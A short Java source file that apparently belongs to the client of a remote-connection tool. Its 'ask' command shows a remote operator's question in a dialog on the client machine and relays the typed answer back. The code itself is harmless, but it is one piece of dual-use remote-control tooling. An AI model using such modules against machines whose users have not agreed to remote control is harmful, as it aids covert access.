package br.com.introcdc.connect.client.commands.message;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:41
 */

import br.com.introcdc.connect.client.command.ClientCommand;

import javax.swing.*;

public class ClientCommandAsk extends ClientCommand {

    public ClientCommandAsk() {
        super("ask");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite uma pergunta!");
            return;
        }
        try {
            new Thread(() -> {
                msg("Pergunta recebida pelo cliente!");
                String message = JOptionPane.showInputDialog(null, input);
                msg("Mensagem: " + message);
            }).start();
        } catch (Exception exception) {
            msg("Ocorreu um erro ao exibir a pergunta pro cliente! (" + exception.getMessage() + ")");
            exception(exception);
        }
    }

}
